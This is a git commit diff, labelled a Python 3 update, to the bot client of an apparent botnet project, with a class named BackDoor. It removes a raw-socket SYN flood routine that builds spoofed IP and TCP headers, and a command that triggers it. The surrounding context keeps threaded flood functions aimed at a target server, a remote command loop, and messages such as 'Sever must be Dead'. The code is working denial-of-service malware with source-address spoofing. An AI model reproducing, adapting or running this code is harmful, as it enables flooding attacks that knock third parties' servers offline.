017b397b28c7aeb27470a9ac500b587041b01089
Drpanoukl4 <107002202+Drpanoukl4@users.noreply.github.com>
2022-10-04 09:48:13 -0400

    Python 3 update

--- Botnet/src/bot/Bot.py
+++ Botnet/src/bot/Bot.py
@@ -1,6 +1,4 @@
 
-from requests import *
-from struct import *
 import socket
 import subprocess
 import threading
@@ -40,7 +38,6 @@ class BackDoor:
                 self.connected = True
 
             except:
-
                 time.sleep(3)
     
     def reliable_send(self, data):
@@ -126,90 +123,6 @@ class BackDoor:
         finally:
 
             soc.close()
-
-
-    def checksum(self, msg):
-        s = 0
-
-        for i in range(0, len(msg), 2):
-            w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
-            s = s + w
-        
-        s = (s>>16) + (s & 0xffff);
-
-        s = ~s & 0xffff
-        
-        return s
-
-
-    def HeaderSyn(self, hosts):
-        global s
-        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-
-        packet = '';
-
-        global source_ip
-        global dest_ip
-        source_ip = '186.89.217.114'
-        dest_ip = hosts
-
-        ihl = 5
-        version = 4
-        tos = 0
-        tot_len = 20 + 20
-        id = random.randint(1, 65535)
-        frag_off = 0
-        ttl = random.randint(1, 255)
-        protocol = socket.IPPROTO_TCP
-        check = 10
-        saddr = socket.inet_aton (source_ip)
-        daddr = hosts
-        ihl_version = (version << 4) + ihl
-        global ip_header
-        ip_header =  pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
-        
-    def Tcp(self, hosts, ports):
-        self.HeaderSyn(hosts)
-        source = random.randint(36000, 65535)
-        dest = ports
-        seq = 0
-        ack_seq = 0
-        doff = 5
-        fin = 0
-        syn = 1
-        rst = 0
-        psh = 0
-        ack = 0
-        urg = 0
-        window = socket.htons(5840)
-        check = 0
-        urg_ptr = 0
-        offset_res = (doff << 4) + 0
-        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
-        tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
-        source_address = socket.inet_aton(source_ip)
-        dest_address = socket.inet_aton(dest_ip)
-        placeholder = 0
-        protocol = socket.IPPROTO_TCP
-        tcp_length = len(tcp_header)
-        psh = pack('!4s4sBBH', source_address , dest_address , placeholder , protocol , tcp_length);
-        psh = psh + tcp_header;
-        tcp_checksum = self.checksum(psh)
-        tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
-        global packet
-        packet = ip_header + tcp_header
-
-
-    def attackSyn(self, hosts, ports):
-        try:
-
-            self.Tcp(hosts, ports)
-            s.sendto(packet, (dest_ip, 0))
-
-        except socket.error as error:
-            print(error)
     
     def execute(self, numreq, hosts, ports):
         for i in range(numreq):
@@ -218,16 +131,7 @@ class BackDoor:
 
             time.sleep(0.01)
 
-        return "\n [!] Acttactinkg Target Server [!]"
-
-    def executesyn(self, numreq, hosts, ports):
-        for i in range(numreq):
-            thread = threading.Thread(target=self.attackSyn, args=(hosts, ports))
-            thread.start()
-
-            time.sleep(0.01)
-
-        return "\n [!] Acttactinkg Target Server [!]"
+        return "\n [!] Sever must be Dead [!]"
 
     def syn(self, hosts, ports):
     
@@ -246,7 +150,7 @@ class BackDoor:
             thread.start()
             time.sleep(0.01)
 
-        return "\n [!] Acttactinkg Target Server [!]"
+        return "\n [!] Sever must be Dead [!]"
 
 
     def run(self):
@@ -265,10 +169,6 @@ class BackDoor:
             elif command[0] == "kill":
                 
                 command_result = self.KILL()
-            
-            elif command[0] == "acttacksyn" and len(command) > 1:
-                
-                command_result = self.executesyn(int(command[1]), command[2], int(command[3]))
 
             elif command[0] == "syn" and len(command) > 1:
                 
